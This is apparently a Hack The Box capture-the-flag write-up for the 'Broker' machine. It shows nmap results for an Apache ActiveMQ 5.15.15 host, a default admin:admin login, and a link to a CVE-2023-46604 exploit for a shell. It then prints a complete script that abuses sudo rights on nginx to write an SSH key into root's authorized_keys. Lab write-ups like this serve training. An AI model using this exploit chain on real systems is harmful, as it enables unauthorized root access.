---
title: HTB Broker (2026)
author: kei5uke
draft: true
description: Writeup for HTB Broker (2026)
tags:
  - linux
  - writeup
---

# Nmap

```
PORT      STATE SERVICE    VERSION                                                                                                                                                                                                        08:37:42 [68/124]
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                    
| ssh-hostkey:                                                                                                                                                                                                                                             
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)                                                                                                                                                                                            
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)                                                                                                                                                                                          
80/tcp    open  http       nginx 1.18.0 (Ubuntu)                                                                                                                                                                                                           
|_http-title: Error 401 Unauthorized                                                                                                                                                                                                                       
| http-auth:                                                                                                                                                                                                                                               
| HTTP/1.1 401 Unauthorized\x0D                                                                                                                                                                                                                            
|_  basic realm=ActiveMQRealm                                                                                                                                                                                                                              
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                                                                                                                
1883/tcp  open  mqtt                                                                                                                                                                                                                                       
|_mqtt-subscribe: Failed to receive control packet from server.                                                                                                                                                                                            
5672/tcp  open  amqp?                                                                                                                                                                                                                                      
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65                                                                                                                                                                                   
| fingerprint-strings:                                                                                                                                                                                                                                     
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:                                                                                                                        
|     AMQP                                                                                                                                                                                                                                                 
|     AMQP                                                                                                                                                                                                                                                 
|     amqp:decode-error                                                                                                                                                                                                                                    
|_    7Connection from client using unsupported AMQP attempted                                                                                                                                                                                             
8161/tcp  open  http       Jetty 9.4.39.v20210325                                                                                                                                                                                                          
| http-auth:                                                                                                                                                                                                                                               
| HTTP/1.1 401 Unauthorized\x0D                                                                                                                                                                                                                            
|_  basic realm=ActiveMQRealm                                                                                                                                                                                                                              
|_http-server-header: Jetty(9.4.39.v20210325)                                                                                                                                                                                                              
|_http-title: Error 401 Unauthorized                                                                                                                                                                                                                       
40107/tcp open  tcpwrapped                                                                                                                                                                                                                                 
61613/tcp open  stomp      Apache ActiveMQ                                                                                                                                                                                                                 
| fingerprint-strings:                                                                                                                                                                                                                                     
|   HELP4STOMP:                                                                                                                                                                                                                                            
|     ERROR                                                                                                                                                                                                                                                
|     content-type:text/plain                                                                                                                                                                                                                              
|     message:Unknown STOMP action: HELP                                                                                                                                                                                                                   
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP                                                                                                                                                                    
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)                                                                                                                                                     
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)                                                                                                                                                     
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)                                                                                                                                                                   
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)                                                                                                                                                                          
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:                                               
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
```

- nginx 1.18.0
- ActiveMQRealm
- AMQP
- Jetty 9.4.39.v20210325
- Apache ActiveMQ
- ActiveMQ OpenWire transport 5.15.15
- 

# HTTP 80

![[HTB Broker - image.png]]

Got in with `admin:admin`

Broker version: `5.15.15`

This gives you a shell: https://github.com/rootsecdev/CVE-2023-46604

# Privilege Escalation

![[HTB Broker - image 1.png]]

activemq user can execute `/usr/sbin/nginx` as root

execute this script as the current user at home directory `~`

```
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

After running the script, use the saved key (~/.ssh/id_rsa) to get into root shell with ssh command.

![[HTB Broker - image 2.png]]
